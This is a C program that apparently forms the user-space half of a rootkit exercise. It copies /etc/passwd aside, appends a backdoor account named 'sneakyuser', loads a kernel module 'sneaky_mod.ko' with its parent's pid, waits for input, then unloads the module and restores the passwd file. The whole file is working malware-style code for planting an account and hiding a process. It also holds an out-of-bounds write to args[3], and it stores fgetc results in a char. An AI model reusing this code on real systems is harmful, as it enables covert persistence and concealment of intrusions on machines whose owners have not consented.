#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <sys/wait.h>

void main() {
  FILE* fp1;
  FILE* fp2;
  char ch;
  fp1 = fopen("/etc/passwd", "r");
  if (fp1 == NULL) {
    puts ("cannot open this file");
    exit(1);
  }
  fp2 = fopen("/tmp/passwd", "w");
  if (fp2 == NULL) {
    puts("Not able to open this file");
    fclose(fp1);
    exit(1);
  }
  while(1) {
    ch = fgetc(fp1);
    if (ch == EOF) {
      break;
    }
    fputc(ch, fp2);
  }
  fclose(fp1);
  fclose(fp2);
  FILE* fp3 = fopen("/etc/passwd", "a");
  if (fp3 == NULL) {
    puts ("cannot open this file");
    exit(1);
  }
  char buffer[256] = "sneakyuser:abc123:2000:2000:sneakuser:/root:bash\n";
  fprintf(fp3, "%s", buffer);
  fclose(fp3);
  pid_t pid;
  pid_t wpid;
  int status;
  char c;
  pid = fork();
  if (pid < 0) {
    printf("%s\n", "fork error!");
  }
  //child process
  else if (pid == 0) {
    char* args[3];
    int sneaky_id = getppid();
    char str[128];
    sprintf(str, "sneaky_pid=%d", sneaky_id);
    args[0] =  "insmod";
    args[1] = "sneaky_mod.ko";
    args[2] = str;
    args[3] = NULL;
    printf("sneaky_process pid = %d\n", sneaky_id);
    execvp(args[0], args);
  } else {
    //parent process
    wpid = waitpid(pid, &status, WUNTRACED);
    if (WIFEXITED(status)) {
      printf("%s, %d\n", "program exited with status", WEXITSTATUS(status));
    }
    if (WIFSIGNALED(status)) {
      printf("%s, %d\n", "Program was killed by signal", WTERMSIG(status));
    }
    do {
      c = getc(stdin);
      if (c == 'q') {
	break;
      }
    } while (1);
  }
  //unload the kernel module when the child process returns
  pid_t pid2;
  pid_t wpid2;
  pid2 = fork();
  if (pid2 == 0) {
    char* argss[4];
    argss[0] = "rmmod";
    argss[1] = "sneaky_mod";
    argss[2] = NULL;
    argss[3] = NULL;
    execvp(argss[0], argss);
  }
  else {    //copy the tmp/passwd file back to the /etc/passwd file
    wpid2 = waitpid(pid2, &status, WUNTRACED);
    if (WIFEXITED(status)) {
      printf("%s, %d\n", "program exited with status", WEXITSTATUS(status));
    }
    if (WIFSIGNALED(status)) {
      printf("%s, %d\n", "program was killed by signal", WTERMSIG(status));
    }
    fp2 = fopen("/tmp/passwd", "r");
    if (fp2 == NULL) {
      puts("Not able to open this file");
      exit(1);
    }
    fp1 = fopen("/etc/passwd", "w");
    if (fp1 == NULL) {
      puts("Not able to open this file");
      fclose(fp2);
      exit(1);
    }
    while (1) {
      ch = fgetc(fp2);
      if (ch == EOF) {
	break;
      }
      fputc(ch, fp1);
    }
    fclose(fp1);
    fclose(fp2);
  }
}
